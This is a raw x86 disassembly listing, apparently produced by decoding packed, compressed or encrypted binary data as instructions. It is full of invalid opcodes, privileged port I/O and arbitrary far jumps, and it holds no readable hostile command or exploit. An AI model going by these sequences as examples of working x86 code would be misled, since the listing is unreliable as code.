  40e5a3:	loopne 0x40e5ae
  40e5a5:	je     0x40e5e5
  40e5a7:	jno    0x40e551
  40e5a9:	retf   
  40e5aa:	jp     0x40e54d
  40e5ac:	sbb    esp,DWORD PTR [edi+0x6b9b3a5a]
  40e5b2:	shr    BYTE PTR [edi-0x47a53e0e],0xf1
  40e5b9:	stc    
  40e5ba:	out    dx,al
  40e5bb:	and    BYTE PTR [ecx+edx*2-0x70631f4b],0x60
  40e5c3:	mov    ebp,0xa10b2901
  40e5c8:	jle    0x40e58e
  40e5ca:	or     al,0x6a
  40e5cc:	xchg   ebx,eax
  40e5cd:	adc    BYTE PTR [ecx],al
  40e5cf:	xchg   edi,eax
  40e5d0:	xor    DWORD PTR [esi-0x60bdfe56],edx
  40e5d6:	cs and al,0x9d
  40e5d9:	bnd ret 0x77a0
  40e5dd:	out    dx,eax
  40e5de:	retf   0x7af5
  40e5e1:	dec    eax
  40e5e2:	ins    BYTE PTR es:[edi],dx
  40e5e3:	daa    
  40e5e4:	pusha  
  40e5e5:	add    al,0xe5
  40e5e7:	mov    bh,0xc6
  40e5e9:	inc    ecx
  40e5ea:	or     ecx,esp
  40e5ec:	sti    
  40e5ed:	outs   dx,DWORD PTR ds:[esi]
  40e5ee:	inc    eax
  40e5ef:	ror    BYTE PTR [edi+0x5e844094],0x55
  40e5f6:	shr    ch,cl
  40e5f8:	outs   dx,DWORD PTR ds:[esi]
  40e5f9:	sub    esp,DWORD PTR [edi]
  40e5fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5fc:	adc    bh,ah
  40e5fe:	adc    BYTE PTR [eax-0x6e69d00d],bl
  40e604:	sub    DWORD PTR [ecx+0x6ec6ddee],eax
  40e60a:	jns    0x40e626
  40e60c:	es and eax,0x60e2f1dc
  40e612:	hlt    
  40e613:	call   DWORD PTR [ecx+0x1cbfb0c6]
  40e619:	push   esi
  40e61a:	out    dx,al
  40e61b:	jo     0x40e645
  40e61d:	mov    eax,ds:0xa5b582bb
  40e622:	jp     0x40e5ab
  40e624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e625:	push   0x834ab96b
  40e62a:	leave  
  40e62b:	imul   ebp,esp,0x4a
  40e62e:	cmp    ecx,DWORD PTR [ebp+0x14ee6149]
  40e634:	add    esi,0x66ebe727
  40e63a:	out    dx,al
  40e63b:	inc    BYTE PTR ds:0xdbd37cfd
  40e641:	jmp    0xd544:0xcbafa13c
  40e648:	mov    ecx,0x5eb7b307
  40e64d:	gs mov ah,0xe9
  40e650:	mov    eax,ds
  40e652:	push   ecx
  40e653:	adc    ah,BYTE PTR cs:[ecx-0x4f]
  40e657:	cmp    DWORD PTR [esi-0x79002235],ebx
  40e65d:	xchg   edi,eax
  40e65e:	out    dx,al
  40e65f:	dec    edi
  40e660:	jmp    0xe326:0x8cfc3a6c
  40e667:	mov    al,ds:0xe3258d8d
  40e66c:	dec    edx
  40e66d:	sti    
  40e66e:	sub    BYTE PTR [esi],0x5e
  40e671:	retf   
  40e672:	push   0xae79b99c
  40e677:	retf   0x60e1
  40e67a:	(bad)  
  40e67b:	xchg   ecx,eax
  40e67c:	xchg   ebp,eax
  40e67d:	push   eax
  40e67e:	pusha  
  40e67f:	cli    
  40e680:	pop    ecx
  40e681:	nop
  40e682:	pop    esi
  40e683:	pop    esp
  40e684:	arpl   WORD PTR [edi-0x1b0403e7],sp
  40e68a:	xchg   esi,eax
  40e68b:	cmp    al,0x5e
  40e68d:	std    
  40e68e:	inc    ebx
  40e68f:	jne    0x40e666
  40e691:	fcmove st,st(0)
  40e693:	and    al,0x49
  40e695:	xor    DWORD PTR [eax-0x5f],edx
  40e698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e699:	aad    0xeb
  40e69b:	mov    es,ecx
  40e69d:	clc    
  40e69e:	jecxz  0x40e6cb
  40e6a0:	pop    esi
  40e6a1:	(bad)  
  40e6a2:	pop    ebp
  40e6a3:	enter  0x5b7f,0x2b
  40e6a7:	push   eax
  40e6a8:	xlat   BYTE PTR ds:[ebx]
  40e6a9:	pusha  
  40e6aa:	ret    0x310e
  40e6ad:	push   edi
  40e6af:	xchg   DWORD PTR ds:0x271aeefc,esi
  40e6b5:	cmovae ebp,DWORD PTR [esi+0x6]
  40e6b9:	test   ebp,esp
  40e6bb:	mov    al,ds:0xbf5ccfe6
  40e6c0:	jl     0x40e644
  40e6c2:	dec    edi
  40e6c3:	pusha  
  40e6c4:	pop    esi
  40e6c5:	jmp    FWORD PTR [esi+0x7e]
  40e6c8:	retf   0x179b
  40e6cb:	add    DWORD PTR [ebp+0x5f92085d],edi
  40e6d1:	sbb    al,BYTE PTR [ecx+0x7c776e8c]
  40e6d7:	es pop esi
  40e6d9:	adc    bl,BYTE PTR [edi+eiz*2-0x3ce9d1b2]
  40e6e0:	retf   
  40e6e1:	pusha  
  40e6e2:	mov    ecx,0xb8253886
  40e6e7:	shr    BYTE PTR [edx-0x2c92fd6a],cl
  40e6ed:	push   ds
  40e6ee:	daa    
  40e6ef:	das    
  40e6f0:	mov    cl,0xe1
  40e6f2:	sahf   
  40e6f3:	leave  
  40e6f4:	xlat   BYTE PTR ds:[ebx]
  40e6f5:	aam    0xfc
  40e6f7:	push   0x32
  40e6f9:	popa   
  40e6fa:	jle    0x40e702
  40e6fc:	ficomp WORD PTR [ebx]
  40e6fe:	or     BYTE PTR [ebp-0x70],ah
  40e701:	cmp    ch,dh
  40e703:	mov    edx,0x8615f3f5
  40e708:	ret    0x7c0d
  40e70b:	repz mov ah,0xba
  40e70e:	jns    0x40e6af
  40e710:	xor    DWORD PTR [ecx*8-0x1c8241aa],0xee0c8d16
  40e71b:	ins    DWORD PTR es:[edi],dx
  40e71c:	or     eax,0x77f50dd5
  40e721:	bound  esi,QWORD PTR [esi]
  40e723:	mov    eax,ds:0x5653bd54
  40e728:	xchg   ecx,eax
  40e729:	jecxz  0x40e786
  40e72b:	in     eax,0x5e
  40e72d:	pop    eax
  40e72e:	jle    0x40e6e2
  40e730:	ds out 0xf1,al
  40e733:	arpl   WORD PTR [eax+eiz*2+0x1925ce9e],dx
  40e73a:	mov    ecx,0xeef9d623
  40e73f:	and    BYTE PTR [ebx],ch
  40e741:	ds lahf 
  40e743:	pop    ecx
  40e744:	push   0x40f0ff51
  40e749:	pop    ebp
  40e74a:	dec    edx
  40e74b:	enter  0x42c7,0xc2
  40e74f:	and    BYTE PTR [edi-0x54],bh
  40e752:	fsub   QWORD PTR [edi]
  40e754:	xor    ecx,DWORD PTR [eax-0x7]
  40e757:	pop    edi
  40e758:	pop    ebp
  40e759:	mov    eax,edi
  40e75b:	outs   dx,DWORD PTR ds:[esi]
  40e75c:	jbe    0x40e73d
  40e75e:	data16 jns 0x40e777
  40e761:	popa   
  40e762:	(bad)  
  40e763:	aam    0xe4
  40e765:	nop
  40e766:	mov    ebp,0xf51346aa
  40e76b:	retf   
  40e76c:	add    al,0x2d
  40e76e:	xchg   DWORD PTR [ecx-0x3194eb2d],esp
  40e774:	fsubr  QWORD PTR [esi]
  40e776:	add    al,0xa1
  40e778:	das    
  40e779:	and    DWORD PTR [ecx+0x3c],0x5a
  40e77d:	cmc    
  40e77e:	adc    eax,0x379d5edc
  40e783:	sti    
  40e784:	iret   
  40e785:	or     ebx,edi
  40e787:	loop   0x40e747
  40e789:	enter  0xa85d,0x79
  40e78d:	adc    al,0xdc
  40e78f:	pop    ecx
  40e790:	int3   
  40e791:	sub    BYTE PTR [ecx+0x60b271e4],0x30
  40e798:	pop    ebx
  40e799:	fsubr  QWORD PTR [ecx+edx*8-0x5c]
  40e79d:	je     0x40e81c
  40e79f:	aad    0x18
  40e7a1:	push   esp
  40e7a2:	fisub  WORD PTR [ebp-0x68f99f0e]
  40e7a8:	ins    BYTE PTR es:[edi],dx
  40e7a9:	lods   al,BYTE PTR ds:[esi]
  40e7aa:	and    eax,0xee441b81
  40e7af:	int    0x87
  40e7b1:	sbb    eax,0x46b1fe02
  40e7b6:	(bad)  
  40e7b7:	mov    al,ds:0xba5889b8
  40e7bc:	xchg   edx,eax
  40e7bd:	fs mov ch,0xe4
  40e7c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7c1:	sub    dh,dl
  40e7c3:	hlt    
  40e7c4:	xchg   esi,eax
  40e7c5:	pusha  
  40e7c6:	popa   
  40e7c7:	xor    eax,0xd490e960
  40e7cc:	pop    esi
  40e7cd:	in     ax,dx
  40e7cf:	or     al,0x83
  40e7d1:	aam    0x3
  40e7d3:	adc    al,0x89
  40e7d5:	mov    al,0x6
  40e7d7:	scas   eax,DWORD PTR es:[edi]
  40e7d8:	inc    ecx
  40e7d9:	outs   dx,DWORD PTR ds:[esi]
  40e7da:	jmp    0x40e779
  40e7dc:	dec    BYTE PTR ds:0xf76e4e6c
  40e7e2:	mov    ebp,DWORD PTR [eax-0x1ef11ba6]
  40e7e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7e9:	loop   0x40e859
  40e7eb:	xchg   edi,eax
  40e7ec:	ja     0x40e856
  40e7ee:	inc    ebx
  40e7ef:	imul   edi,DWORD PTR ds:0xf9483a61,0xfffffffc
  40e7f6:	inc    esi
  40e7f7:	sbb    al,0x14
  40e7f9:	push   esi
  40e7fa:	out    dx,al
  40e7fb:	push   ebp
  40e7fc:	in     eax,0x15
  40e7fe:	fcomp  QWORD PTR [ebp-0x7a]
  40e801:	adc    al,0xa7
  40e803:	mov    al,ds:0xe2574805
  40e808:	jnp    0x40e80b
  40e80a:	jl     0x40e802
  40e80c:	pop    esi
  40e80d:	sbb    al,0xb9
  40e80f:	push   edi
  40e810:	push   edi
  40e811:	ja     0x40e7df
  40e813:	xor    eax,esi
  40e815:	dec    edx
  40e816:	mov    dh,0xd2
  40e818:	pop    ebp
  40e819:	pusha  
  40e81a:	pop    edi
  40e81b:	sbb    DWORD PTR [edx],edi
  40e81d:	mov    esi,0xa8d96d55
  40e822:	out    dx,al
  40e823:	mov    ecx,0xffd954dc
  40e829:	mov    ah,0x27
  40e82b:	mov    eax,ds:0x6a795247
  40e830:	rol    DWORD PTR gs:[eax-0xe],cl
  40e834:	pop    esi
  40e835:	add    al,0x75
  40e837:	int    0xd1
  40e839:	sub    DWORD PTR gs:[ecx],ebx
  40e83c:	push   ebp
  40e83d:	shl    DWORD PTR [eax+0x306566a1],0xb5
  40e844:	lods   eax,DWORD PTR ds:[esi]
  40e845:	sti    
  40e846:	inc    ebx
  40e847:	adc    eax,0xe32a805e
  40e84c:	test   BYTE PTR [ebp+0x614ad365],dh
  40e852:	rol    dh,1
  40e854:	pop    ebp
  40e855:	(bad)  [esi]
  40e857:	out    dx,eax
  40e858:	jo     0x40e8a7
  40e85a:	pop    esp
  40e85b:	inc    ebp
  40e85c:	push   ss
  40e85d:	fcom   QWORD PTR [ebp-0x5f]
  40e860:	nop
  40e861:	adc    BYTE PTR [edx+0x5356f040],ah
  40e867:	test   DWORD PTR [edi-0x3876afa0],esp
  40e86d:	mov    BYTE PTR [edx-0x15431a1f],bl
  40e873:	inc    esp
  40e874:	push   cs
  40e875:	xchg   edx,eax
  40e876:	(bad)  [ebp+0x7f4e7ade]
  40e87c:	stc    
  40e87d:	lock addr16 mov eax,ds:0x469c
  40e882:	dec    edi
  40e883:	xor    al,BYTE PTR [ebp-0x5f]
  40e886:	and    BYTE PTR [eax+0x72],bh
  40e889:	inc    ebx
  40e88a:	xchg   BYTE PTR [ecx+0x5e],bh
  40e88d:	ret    0x6b68
  40e890:	dec    esi
  40e891:	call   0xa18d:0xf0cc5155
  40e898:	test   BYTE PTR [ecx+0x43b50911],cl
  40e89e:	inc    ebx
  40e89f:	jnp    0x40e8ff
  40e8a1:	fst    st(1)
  40e8a3:	sub    ebp,edi
  40e8a5:	and    BYTE PTR [edx],bl
  40e8a7:	mov    DWORD PTR [ecx],esi
  40e8a9:	popa   
  40e8aa:	mov    ebp,0x1d959539
  40e8af:	sbb    BYTE PTR [esi-0x47],al
  40e8b2:	out    dx,al
  40e8b3:	ret    
  40e8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8b5:	xchg   esp,eax
  40e8b6:	mov    ebx,edx
  40e8b8:	or     BYTE PTR [esi-0x5f],dh
  40e8bb:	scas   eax,DWORD PTR es:[edi]
  40e8bc:	addr16 (bad) 
  40e8be:	out    dx,al
  40e8bf:	and    dl,BYTE PTR ds:[ecx-0x477f7de8]
  40e8c6:	jmp    0x458cd1e9
  40e8cb:	arpl   WORD PTR [esi-0x1eb36922],bx
  40e8d1:	pusha  
  40e8d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8d3:	icebp  
  40e8d4:	cmp    DWORD PTR [ebp+ecx*2-0x6c],esp
  40e8d8:	scas   eax,DWORD PTR es:[edi]
  40e8d9:	mov    gs,esi
  40e8db:	cmp    dh,BYTE PTR [edx+ebp*4-0x52]
  40e8df:	mov    eax,ds:0xa1009216
  40e8e4:	ins    DWORD PTR es:[edi],dx
  40e8e5:	(bad)  
  40e8e6:	jae    0x40e892
  40e8e8:	mov    esi,0x5ff0fd3b
  40e8ed:	aam    0x47
  40e8ef:	fs mov edi,0xa158e6e4
  40e8f5:	ins    DWORD PTR es:[edi],dx
  40e8f6:	push   esi
  40e8f7:	cmp    BYTE PTR [esi-0x17431129],cl
  40e8fd:	xor    al,BYTE PTR [esi-0x76]
  40e900:	pop    esp
  40e901:	adc    DWORD PTR [edx+0x7737e1a1],esi
  40e907:	(bad)  
  40e908:	std    
  40e909:	push   eax
  40e90a:	iret   
  40e90b:	pop    esp
  40e90c:	js     0x40e8f8
  40e90e:	out    dx,al
  40e90f:	popf   
  40e910:	lods   eax,DWORD PTR ds:[esi]
  40e911:	(bad)  
  40e912:	(bad)  
  40e913:	ds add al,0xdb
  40e916:	scas   eax,DWORD PTR es:[edi]
  40e917:	mov    al,ds:0xb3aa05a7
  40e91c:	sbb    DWORD PTR [ecx],ebx
  40e91e:	jge    0x40e904
  40e920:	leave  
  40e921:	ror    bh,0xbe
  40e924:	xchg   ebx,eax
  40e925:	pusha  
  40e926:	push   edx
  40e927:	lock test al,0x9a
  40e92a:	dec    DWORD PTR [eax-0x5011abd5]
  40e930:	adc    al,0xd7
  40e932:	mov    ch,0xf1
  40e934:	out    dx,al
  40e935:	push   0xb30f7915
  40e93a:	or     DWORD PTR [ecx-0x5527b205],esp
  40e940:	or     BYTE PTR ds:0x7f5e156c,cl
  40e946:	loopne 0x40e9b1
  40e948:	scas   eax,DWORD PTR es:[edi]
  40e949:	stc    
  40e94a:	mov    al,ds:0xeb2f2a2a
  40e94f:	int3   
  40e950:	sub    BYTE PTR [edi-0x12],ch
  40e953:	jnp    0x40e9b9
  40e955:	or     al,0xbe
  40e957:	das    
  40e958:	in     eax,0x1c
  40e95a:	add    BYTE PTR [eax+0x7b6f2647],cl
  40e960:	mov    ecx,0x3dba5a80
  40e965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e966:	(bad)  
  40e968:	je     0x40e955
  40e96a:	mul    DWORD PTR [eax+0x4a33add0]
  40e970:	ins    DWORD PTR es:[edi],dx
  40e971:	inc    edi
  40e972:	fstp   DWORD PTR [bx-0x2d]
  40e976:	push   ebx
  40e977:	xchg   edx,eax
  40e978:	lds    edi,FWORD PTR [ecx-0x48]
  40e97b:	pusha  
  40e97c:	and    eax,0x66a0f82b
  40e981:	pop    ebp
  40e982:	inc    edx
  40e983:	cmp    esi,DWORD PTR [edi-0x77]
  40e986:	mov    ah,0x1e
  40e988:	imul   ebx,DWORD PTR [eax+0x1a5b3bba],0x5e22023c
  40e992:	pop    es
  40e993:	nop
  40e994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e995:	loopne 0x40e9d8
  40e997:	(bad)  
  40e998:	jmp    0x40ea06
  40e99a:	fwait
  40e99b:	lahf   
  40e99c:	rol    BYTE PTR [eax],0x29
  40e99f:	mov    WORD PTR [eax],ss
  40e9a1:	popa   
  40e9a2:	pop    ss
  40e9a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9a4:	sbb    al,0x8d
  40e9a6:	in     eax,0xd9
  40e9a8:	pop    esi
  40e9a9:	mov    eax,ds:0x90da5fce
  40e9ae:	dec    esp
  40e9af:	in     eax,dx
  40e9b0:	mov    esi,0xd5c2335d
  40e9b5:	adc    cl,ah
  40e9b7:	push   ebx
  40e9b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9b9:	ds hlt 
  40e9bb:	int    0x5b
  40e9bd:	lea    esp,[esi]
  40e9bf:	sahf   
  40e9c0:	lods   al,BYTE PTR ds:[esi]
  40e9c1:	rcr    DWORD PTR [esi],cl
  40e9c3:	cmp    ah,bl
  40e9c5:	push   edx
  40e9c6:	stos   BYTE PTR es:[edi],al
  40e9c7:	fcmovne st,st(2)
  40e9ca:	dec    edi
  40e9cb:	(bad)  
  40e9cc:	fidivr WORD PTR [ebx-0x49]
  40e9cf:	xor    eax,0x954ca32b
  40e9d4:	pop    esi
  40e9d5:	and    al,0x9a
  40e9d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9d8:	mov    ch,0x9a
  40e9da:	mov    ah,0xc1
  40e9dc:	(bad)  
  40e9dd:	pusha  
  40e9de:	aaa    
  40e9df:	fld    DWORD PTR [edi+0x5c145c73]
  40e9e5:	inc    esi
  40e9e6:	out    dx,al
  40e9e7:	jne    0x40ea58
  40e9e9:	test   eax,0x6fa66b86
  40e9ee:	inc    edx
  40e9ef:	mov    eax,ds:0x1ff07db7
  40e9f4:	push   0x4f756bb9
  40e9f9:	fld    DWORD PTR [esi+ebp*4]
  40e9fc:	pop    esi
  40e9fd:	dec    ecx
  40e9fe:	test   DWORD PTR [eax+0x7],ebp
  40ea01:	std    
  40ea02:	mov    bl,0x8e
  40ea04:	mov    dl,BYTE PTR [edi]
  40ea06:	mov    al,ds:0x508e006c
  40ea0c:	dec    esp
  40ea0d:	in     al,dx
  40ea0e:	ffreep st(0)
  40ea10:	mov    WORD PTR [esi+0x52856aee],?
  40ea16:	sub    BYTE PTR [edi],0x0
  40ea19:	aaa    
  40ea1a:	mov    fs,WORD PTR [ecx-0x44de92b0]
  40ea20:	and    DWORD PTR [edx+0x17],0x31
  40ea24:	pop    esi
  40ea25:	sbb    BYTE PTR [ecx],bh
  40ea27:	pop    esi
  40ea28:	and    ebp,eax
  40ea2a:	popf   
  40ea2b:	(bad)  
  40ea2c:	iret   
  40ea2d:	xor    BYTE PTR [ebx-0x5f],ch
  40ea30:	cwde   
  40ea31:	addr16 mov edi,0xc5d3178a
  40ea37:	jmp    0xdef6:0x55233c5e
  40ea3e:	mov    al,ds:0xf4420f9d
  40ea43:	in     eax,0x73
  40ea45:	loope  0x40eab6
  40ea47:	or     esi,DWORD PTR [ecx+esi*1+0x74]
  40ea4b:	cld    
  40ea4c:	cwde   
  40ea4d:	pop    ecx
  40ea4e:	mov    eax,ds:0x2b50ecb6
  40ea53:	rcr    BYTE PTR [ebp-0x56],0xe3
  40ea57:	out    dx,eax
  40ea58:	pop    esi
  40ea59:	cdq    
  40ea5a:	ja     0x40ea17
  40ea5c:	and    al,0xa6
  40ea5f:	push   ebp
  40ea60:	adc    eax,DWORD PTR [ebx-0xd]
  40ea63:	jbe    0x40e9fe
  40ea65:	mov    al,ds:0xa2728ce8
  40ea6a:	je     0x40e9fd
  40ea6c:	pop    esi
  40ea6d:	sbb    ch,BYTE PTR [edi-0x77e6bae7]
  40ea73:	pop    es
  40ea74:	inc    edi
  40ea75:	popa   
  40ea76:	ret    
  40ea77:	(bad)  
  40ea79:	and    eax,0xee15968
  40ea7e:	out    dx,al
  40ea7f:	aas    
  40ea80:	cmp    ebp,DWORD PTR [ebx]
  40ea82:	in     al,dx
  40ea83:	adc    esp,DWORD PTR [ebx]
  40ea85:	mov    ebp,0x4327a17e
  40ea8a:	inc    esi
  40ea8b:	push   esi
  40ea8c:	mov    al,0x44
  40ea8e:	vdivps ymm5,ymm4,ymm4
  40ea92:	scas   al,BYTE PTR es:[edi]
  40ea93:	bnd jno 0x40eae8
  40ea96:	stc    
  40ea97:	adc    al,0xff
  40ea99:	pusha  
  40ea9a:	xlat   BYTE PTR ds:[ebx]
  40ea9b:	xor    ebx,ecx
  40ea9d:	pop    ss
  40ea9e:	mov    ah,0xf5
  40eaa0:	test   DWORD PTR [edi+0x35f17edf],ebp
  40eaa6:	out    dx,al
  40eaa7:	ror    DWORD PTR [edi-0x6a86dc40],1
  40eaad:	fld    DWORD PTR [ecx+eiz*4]
  40eab0:	adc    edi,DWORD PTR ds:0xc893736c
  40eab6:	mov    ds,ecx
  40eab8:	pop    esi
  40eab9:	(bad)  
  40eaba:	xchg   ecx,eax
  40eabb:	(bad)
  40eabe:	es (bad) 
  40eac0:	mov    edi,0xfbd32860
  40eac5:	cld    
  40eac6:	div    BYTE PTR [edx]
  40eac8:	and    al,0xf1
  40eaca:	out    dx,al
  40eacb:	cs mov ebp,0xa81a6c2c
  40ead1:	jmp    0x9a10:0xbb087ccc
  40ead8:	ss cmp bh,cl
  40eadb:	in     al,0x5f
  40eadd:	retf   
  40eade:	lods   al,BYTE PTR ds:[esi]
  40eadf:	mov    esi,DWORD PTR [esi-0xb]
  40eae2:	(bad)  
  40eae3:	or     al,0x5e
  40eae5:	push   cs
  40eae6:	stc    
  40eae7:	or     ebp,ecx
  40eae9:	pop    esi
  40eaea:	and    DWORD PTR [ebp+0x3],ecx
  40eaed:	popa   
  40eaee:	(bad)  
  40eaef:	loopne 0x40eb3f
  40eaf1:	and    BYTE PTR [edx],ah
  40eaf3:	pushf  
  40eaf4:	sub    DWORD PTR [esi+0x3863935c],ebx
  40eafa:	dec    ebx
  40eafb:	dec    esi
  40eafc:	repnz aas 
  40eafe:	push   0xffffff8a
  40eb00:	lds    ebx,FWORD PTR [esi+0x56]
  40eb03:	pop    esi
  40eb04:	and    al,0x61
  40eb06:	xchg   edi,eax
  40eb07:	push   es
  40eb08:	inc    esi
  40eb09:	cmp    bl,BYTE PTR [eax]
  40eb0b:	(bad)  
  40eb0c:	enter  0xed7d,0x3c
  40eb10:	gs loope 0x40eafd
  40eb13:	ins    DWORD PTR es:[edi],dx
  40eb14:	jnp    0x40eb2b
  40eb16:	cmp    ch,BYTE PTR [ebx-0x16]
  40eb19:	addr16 dec esp
  40eb1b:	and    BYTE PTR [esi-0x4d],bl
  40eb1e:	call   0x5efe:0x4b9308a6
  40eb25:	and    dh,BYTE PTR [ecx+ebx*4-0x23]
  40eb29:	fldcw  WORD PTR [edx]
  40eb2b:	into   
  40eb2c:	das    
  40eb2d:	popa   
  40eb2e:	and    ch,BYTE PTR [edx+0x6a55389e]
  40eb34:	push   ebp
  40eb35:	das    
  40eb36:	out    dx,al
  40eb37:	fimul  WORD PTR [ecx]
  40eb39:	lods   eax,DWORD PTR ds:[esi]
  40eb3a:	aaa    
  40eb3b:	test   DWORD PTR [ebx+0x4e],ebp
  40eb3e:	or     esp,DWORD PTR [ecx-0x1f367c24]
  40eb44:	mov    cs,eax
  40eb46:	mov    BYTE PTR [eax-0x770e13a2],cl
  40eb4c:	jno    0x40eb24
  40eb4e:	data16 ins BYTE PTR es:[edi],dx
  40eb50:	cs stos DWORD PTR es:[edi],eax
  40eb52:	fisub  WORD PTR [ecx+0x40fdbf7c]
  40eb58:	cmp    BYTE PTR [ecx+0x1f],al
  40eb5b:	or     DWORD PTR [eax+ebp*2+0x22a74eee],0x2b49451c
  40eb66:	call   0x7c56f0c
  40eb6b:	sub    esi,DWORD PTR ds:0xb0f116a0
  40eb71:	shr    esi,0x66
  40eb74:	hlt    
  40eb75:	clc    
  40eb76:	and    DWORD PTR [ebx+0x7],edi
  40eb79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb7a:	mov    dl,0xa0
  40eb7c:	cmp    al,0xda
  40eb7e:	fsub   st,st(4)
  40eb80:	jmp    0x40ebb5
  40eb82:	cld    
  40eb83:	mov    dh,0x5d
  40eb85:	jns    0x40eb8c
  40eb87:	mov    eax,0xa02afee9
  40eb8c:	(bad)  
  40eb8d:	ins    BYTE PTR es:[edi],dx
  40eb8e:	add    BYTE PTR [ecx-0x76cb4df7],ah
  40eb94:	mov    esp,DWORD PTR [ebx]
  40eb96:	sahf   
  40eb97:	aam    0xe9
  40eb99:	jmp    0xc84:0x54932eee
  40eba0:	cmp    bh,BYTE PTR [ebx+0x26]
  40eba3:	mov    eax,ds:0x57fabaf
  40eba8:	fxam   
  40ebaa:	cmp    eax,0xdf506e51
  40ebaf:	aad    0x5e
  40ebb1:	mov    dh,0xf9
  40ebb3:	xor    dh,BYTE PTR [ebx+0x1c]
  40ebb6:	js     0x40ebff
  40ebb8:	cli    
  40ebb9:	mov    esp,0x44fd08ba
  40ebbe:	and    bl,BYTE PTR [esi+eiz*8-0x20]
  40ebc2:	sbb    DWORD PTR [edi+edi*2+0x5e7d549e],ecx
  40ebc9:	dec    ecx
  40ebca:	pop    ecx
  40ebcb:	repz ret 
  40ebcd:	cmovge ecx,DWORD PTR [ebp-0x649a9f90]
  40ebd4:	adc    al,0x77
  40ebd6:	jbe    0x40ebb4
  40ebd8:	in     eax,dx
  40ebd9:	pop    esi
  40ebda:	and    eax,0xd4d5d8c3
  40ebdf:	push   edi
  40ebe0:	mov    ah,al
  40ebe2:	pusha  
  40ebe3:	in     eax,dx
  40ebe4:	xchg   DWORD PTR ds:0x2623a0b1,ecx
  40ebea:	jne    0x40ec2c
  40ebec:	mov    esp,0xf825df41
  40ebf1:	jmp    0x40ebe1
  40ebf3:	pop    ebp
  40ebf4:	(bad)  
  40ebf5:	(bad)  
  40ebf6:	gs dec esi
  40ebf8:	lods   eax,DWORD PTR ds:[esi]
  40ebf9:	sub    eax,eax
  40ebfb:	mov    al,ds:0x824158
  40ec00:	out    0x69,al
  40ec02:	in     al,0xed
  40ec04:	pop    ebx
  40ec05:	mov    ecx,0xaa8e9bba
  40ec0a:	loopne 0x40ebac
  40ec0c:	(bad)  
  40ec0d:	call   DWORD PTR [eax+0x54]
  40ec10:	add    esp,DWORD PTR [ecx-0x11]
  40ec13:	ds (bad) 
  40ec15:	sti    
  40ec16:	or     esi,DWORD PTR [ebx-0x23112096]
  40ec1c:	stos   BYTE PTR es:[edi],al
  40ec1d:	push   es
  40ec1e:	repz js 0x40ec68
  40ec21:	sar    BYTE PTR [eax],1
  40ec23:	mov    eax,ds:0x2cbaf1a5
  40ec28:	pop    ecx
  40ec29:	repz pop edx
  40ec2b:	aaa    
  40ec2c:	pop    ebp
  40ec2d:	mov    bl,0xe1
  40ec2f:	add    BYTE PTR [edx-0x1970711],ch
  40ec35:	push   ebp
  40ec36:	hlt    
  40ec37:	mov    eax,ds:0x9862e9f9
  40ec3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec3d:	mov    eax,0x2c0274e5
  40ec42:	out    dx,al
  40ec43:	mov    WORD PTR [ebp-0x7c],ss
  40ec46:	mov    eax,0xbd26ee6b
  40ec4b:	mov    al,ds:0x2483456
  40ec50:	je     0x40ecc8
  40ec52:	nop
  40ec53:	push   ds
  40ec54:	pop    esi
  40ec55:	rcl    esp,cl
  40ec57:	cmp    edi,DWORD PTR [ecx*2+0x22885630]
  40ec5e:	fsub   QWORD PTR [eax+0x3fc614b5]
  40ec64:	push   eax
  40ec65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec66:	jle    0x40ece0
  40ec68:	repz or DWORD PTR [eax+0x4d],ecx
  40ec6c:	pop    esi
  40ec6d:	fsubr  st(7),st
  40ec6f:	jmp    FWORD PTR [edi+eax*1+0x7b4e4e74]
  40ec76:	adc    al,0x7c
  40ec78:	imul   eax,DWORD PTR [edx+0x23],0x22
  40ec7c:	xchg   ebx,eax
  40ec7d:	jo     0x40ec2e
  40ec7f:	push   esi
  40ec80:	jl     0x40ec3e
  40ec82:	aad    0x6c
  40ec84:	pop    esi
  40ec85:	xchg   edi,eax
  40ec86:	cmc    
  40ec87:	xor    bl,BYTE PTR [edi+0x36]
  40ec8a:	xchg   edi,eax
  40ec8b:	adc    DWORD PTR [ebp-0x15adb3a0],0x31cfd673
  40ec95:	lock out dx,eax
  40ec97:	xor    BYTE PTR [eax],dh
  40ec99:	jmp    0xd0300e1e
  40ec9e:	leave  
  40ec9f:	lahf   
  40eca0:	push   cs
  40eca1:	pusha  
  40eca2:	xchg   di,ax
  40eca4:	(bad)  
  40eca5:	js     0x40ec2b
  40eca7:	jmp    0x40ec9d
  40eca9:	jo     0x40ec80
  40ecab:	sub    dl,BYTE PTR [edi]
  40ecad:	dec    ecx
  40ecae:	push   esi
  40ecaf:	mov    ds,WORD PTR [esi-0x10]
  40ecb2:	nop
  40ecb3:	push   edi
  40ecb4:	pop    ecx
  40ecb5:	xchg   ebp,eax
  40ecb6:	sahf   
  40ecb7:	push   esi
  40ecb8:	pop    esi
  40ecb9:	sbb    BYTE PTR [edi-0x27],bh
  40ecbc:	mov    bh,0xb5
  40ecbe:	arpl   WORD PTR [edi-0x24c9fef],si
  40ecc4:	in     al,dx
  40ecc5:	(bad)  
  40ecc6:	jne    0x40ed12
  40ecc8:	xor    DWORD PTR [ecx+0x395ac437],ebp
  40ecce:	mov    ds:0x2d46b928,eax
  40ecd3:	mov    ebx,0x9b62ffba
  40ecd8:	es test eax,0x449e73dd
  40ecde:	mov    dl,0xa0
  40ece0:	sbb    dl,cl
  40ece2:	push   ebx
  40ece3:	mov    ds:0x807ff0d4,al
  40ece8:	pop    esi
  40ece9:	aaa    
  40ecea:	and    al,0x8f
  40ecec:	xchg   ecx,eax
